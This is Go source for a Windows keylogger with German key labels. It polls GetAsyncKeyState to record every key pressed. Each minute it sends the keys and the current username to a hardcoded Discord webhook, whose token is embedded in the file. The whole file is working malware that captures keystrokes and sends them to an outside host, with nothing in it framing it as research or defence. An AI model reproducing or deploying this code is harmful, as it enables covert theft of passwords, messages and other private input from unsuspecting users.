package internal

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os/user"
	"syscall"
	"time"
)

var (
	user32               = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
)

const WebURL = "https://discord.com/api/webhooks/1481633035622416465/YKSrRy6XgzBXhAj-APkj94kRYY6KmwVXMK3w0H0-mody_hZKbe29Auog9dmqO47Rn5yR"

var Pressed []string

var keyMap = map[int]string{
	0x41: "A", 0x42: "B", 0x43: "C", 0x44: "D", 0x45: "E",
	0x46: "F", 0x47: "G", 0x48: "H", 0x49: "I", 0x4A: "J",
	0x4B: "K", 0x4C: "L", 0x4D: "M", 0x4E: "N", 0x4F: "O",
	0x50: "P", 0x51: "Q", 0x52: "R", 0x53: "S", 0x54: "T",
	0x55: "U", 0x56: "V", 0x57: "W", 0x58: "X", 0x59: "Y",
	0x5A: "Z",

	0x30: "0", 0x31: "1", 0x32: "2", 0x33: "3", 0x34: "4",
	0x35: "5", 0x36: "6", 0x37: "7", 0x38: "8", 0x39: "9",

	0x20: "LEERZEICHEN",
	0xBA: "Ö",          // Ö
	0xBB: "PLUS",       // +
	0xBC: "KOMMA",      // ,
	0xBD: "MINUS",      // -
	0xBE: "PUNKT",      // .
	0xBF: "RAUTE",      // #
	0xC0: "ZIRCUMFLEX", // ^
	0xDB: "Ü",          // Ü
	0xDC: "BACKSLASH",  // \
	0xDD: "Ä",          // Ä
	0xDE: "HASH",       // '

	0x08: "BACKSPACE",
	0x09: "TAB",
	0x0D: "ENTER",
	0x10: "SHIFT",
	0x11: "STRG",
	0x12: "ALT",
	0x1B: "ESC",
	0x2E: "ENTF",

	0x25: "LINKS",
	0x26: "OBEN",
	0x27: "RECHTS",
	0x28: "UNTEN",

	0x70: "F1", 0x71: "F2", 0x72: "F3", 0x73: "F4",
	0x74: "F5", 0x75: "F6", 0x76: "F7", 0x77: "F8",
	0x78: "F9", 0x79: "F10", 0x7A: "F11", 0x7B: "F12",
}

func RecordKeys() {
	pressedKeys := make([]bool, 256)
	for {
		for keyCode := 0; keyCode < 256; keyCode++ {
			if isKeyPressed(keyCode) {
				if !pressedKeys[keyCode] {
					keyName := getKeyName(keyCode)
					if keyName != "" {
						Pressed = append(Pressed, keyName)
					}
					pressedKeys[keyCode] = true
				}
			} else {
				pressedKeys[keyCode] = false
			}
		}
		time.Sleep(10 * time.Millisecond)
	}
}

func Timer() {
	ticker := time.NewTicker(time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		if len(Pressed) > 0 {
			sendToWeb()
			Pressed = nil
		}
	}
}

func isKeyPressed(keyCode int) bool {
	ret, _, _ := procGetAsyncKeyState.Call(uintptr(keyCode))
	return ret&0x8000 != 0
}

func getKeyName(keyCode int) string {
	if name, exists := keyMap[keyCode]; exists {
		return name
	}
	return fmt.Sprintf("KEY_%d", keyCode) // Fallback für unbekannte Tasten
}

func sendToWeb() {
	currentTime := time.Now().Format("15:04:05")

	currentUser, err := user.Current()

	var keys []string
	for _, key := range Pressed {
		keys = append(keys, key)
	}

	payload := map[string]string{
		"content": fmt.Sprintf("%s,**%s**: %v", currentUser.Username, currentTime, keys),
	}

	jsonData, _ := json.Marshal(payload)
	_, err = http.Post(WebURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Fehler beim Senden:", err)
	}
}
